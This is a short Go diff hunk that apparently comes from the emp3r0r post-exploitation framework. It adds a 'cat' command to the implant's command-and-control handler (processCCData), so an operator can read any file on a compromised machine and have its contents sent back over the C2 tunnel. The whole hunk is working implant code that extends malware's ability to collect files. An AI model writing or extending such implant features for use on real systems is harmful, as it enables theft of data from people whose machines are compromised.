@@ -81,6 +81,21 @@ func processCCData(data *emp3r0r_def.MsgTunData) {
 			out = fmt.Sprintf("Failed to ps: %v", err)
 			break
 		}
+	case "cat":
+		// Usage: cat --dst <file>
+		// Reads the contents of the specified file.
+		file_to_read := flags.StringP("dst", "d", "", "File to read")
+		flags.Parse(cmdSlice[1:])
+		if *file_to_read == "" {
+			out = fmt.Sprintf("error: no file specified: %v", cmdSlice)
+			break
+		}
+
+		out, err = util.DumpFile(*file_to_read)
+		if err != nil {
+			out = fmt.Sprintf("%v: %s", err, out)
+			break
+		}
 	case "kill":
 		// Usage: kill --pid <pid>...
 		// Kills the specified processes.
